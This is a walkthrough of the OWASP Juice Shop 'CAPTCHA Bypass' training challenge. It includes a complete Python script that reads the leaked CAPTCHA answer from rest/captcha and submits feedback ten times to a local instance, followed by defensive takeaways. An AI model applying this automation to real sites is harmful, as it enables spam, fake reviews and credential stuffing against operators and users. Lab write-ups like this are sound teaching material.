---
id: captcha-bypass
slug: /juice-shop-master/captcha-bypass
title: CAPTCHA Bypass Challenge
---

# CAPTCHA Bypass Challenge

**Category:** Improper Input Validation (OWASP Top 10: A04:2021 – Insecure Design)

A walkthrough of the **CAPTCHA Bypass** challenge in [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) — automating customer feedback submissions by exploiting a CAPTCHA endpoint that hands you the answer for free.

## Video Walkthrough (german)

https://www.loom.com/share/73e5edfe311d4fe7aee8f19259330a61

## Goal

Submit the same feedback form response 10 times within a few seconds, bypassing the CAPTCHA that is supposed to prevent automated submissions.

## Step 1: Investigate the CAPTCHA with Burp Suite

I opened the **customer feedback** page and inspected the traffic with Burp Suite to understand how the CAPTCHA is implemented. On every page load, the frontend requests the `rest/captcha` endpoint. The response contains the CAPTCHA ID, the question itself, and — critically — the correct answer:

```json
{ "captchaId": 1, "captcha": "6+5+2", "answer": "13" }
```

The server computes the answer and sends it straight back to the client instead of only validating it server-side. There's no need to solve anything; the answer is handed to us directly. The CAPTCHA is also refreshed automatically after every feedback submission, so a new `captchaId`/`answer` pair has to be fetched before each request.

## Step 2: Automate Feedback Submission

Since the answer is always available from `rest/captcha`, I wrote a Python script that:

1. Fetches a fresh CAPTCHA (`captchaId` + `answer`) from `rest/captcha`.
2. Submits a feedback via `POST /api/Feedbacks/`, embedding the CAPTCHA ID and its answer in the payload.
3. Repeats this 10 times in a loop.

```python
#!/usr/bin/env python3
"""
Sends the POST /api/Feedbacks/ request 10 times against a local instance
(e.g. OWASP Juice Shop at http://127.0.0.1:3000).
"""

import requests

BASE_URL = "http://127.0.0.1:3000"
CAPTCHA_URL = f"{BASE_URL}/rest/captcha"
URL = f"{BASE_URL}/api/Feedbacks/"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "http://127.0.0.1:3000/",
    "Authorization": "Bearer ",
    "Content-Type": "application/json",
    "Origin": "http://127.0.0.1:3000",
}

# Cookies from the original request (update as needed)
COOKIES = {
    "language": "en",
    "welcomebanner_status": "dismiss",
    "cookieconsent_status": "dismiss",
    "continueCode": "...",
    "continueCodeFindIt": "...",
    "continueCodeFixIt": "...",
    "token": "",
}

BASE_PAYLOAD = {
    "UserId": 1,
    "comment": "test (***in@email)",
    "rating": 2,
}

NUM_REQUESTS = 10


def get_captcha():
    """Fetches /rest/captcha and returns (captchaId, answer)."""
    response = requests.get(CAPTCHA_URL, headers=HEADERS, cookies=COOKIES, timeout=10)
    response.raise_for_status()
    data = response.json()

    captcha_id = data.get("captchaId")
    answer = data.get("answer")  # Juice Shop hands us the solution directly

    if captcha_id is None or answer is None:
        raise ValueError(f"Unexpected captcha format: {data}")

    return captcha_id, str(answer)


def main():
    for i in range(1, NUM_REQUESTS + 1):
        try:
            captcha_id, answer = get_captcha()

            payload = dict(BASE_PAYLOAD)
            payload["captchaId"] = captcha_id
            payload["captcha"] = answer

            response = requests.post(URL, headers=HEADERS, cookies=COOKIES, json=payload, timeout=10)
            print(
                f"[{i}/{NUM_REQUESTS}] captchaId={captcha_id} captcha={answer} "
                f"-> Status: {response.status_code} - {response.text[:200]}"
            )
        except requests.RequestException as e:
            print(f"[{i}/{NUM_REQUESTS}] Request error: {e}")
        except ValueError as e:
            print(f"[{i}/{NUM_REQUESTS}] Captcha error: {e}")


if __name__ == "__main__":
    main()
```

The full script is available on GitHub: [send_feedback.py](https://github.com/TobiasMatthies/pentesting-tools/).

## Step 3: Run It

Running the script fires off 10 feedback submissions in quick succession, each with a freshly fetched, correctly-solved CAPTCHA — completing the challenge.

```
[1/10] captchaId=1 captcha=13 -> Status: 201 - {"id":...}
[2/10] captchaId=2 captcha=... -> Status: 201 - {"id":...}
...
[10/10] captchaId=10 captcha=... -> Status: 201 - {"id":...}
```

## Key Takeaways

- A CAPTCHA is only as strong as its answer-handling: if the solution is ever exposed to the client (even for a "human-solvable" math CAPTCHA), it can trivially be automated away.
- Intercepting proxies like Burp Suite make it easy to spot when an endpoint is leaking more than it should.
- Automated challenge/response flows should be validated purely server-side, with the answer never traveling to the client in the challenge response.

## Security Risk & Impact

A CAPTCHA is meant to prove a request comes from a human, stopping bots from mass-creating accounts, spamming forms, or brute-forcing logins. When the "proof" is trivially recoverable — as here, where the answer is shipped in the challenge response itself — the control provides no real protection at all. In a production system this can enable large-scale automated abuse: spam campaigns, fake review/feedback flooding, credential-stuffing at scale, or resource-exhaustion attacks, all while the system believes it is only talking to verified humans. The broader lesson is that any anti-automation or anti-abuse control must be validated entirely server-side, with no part of the "secret" ever exposed to the client.
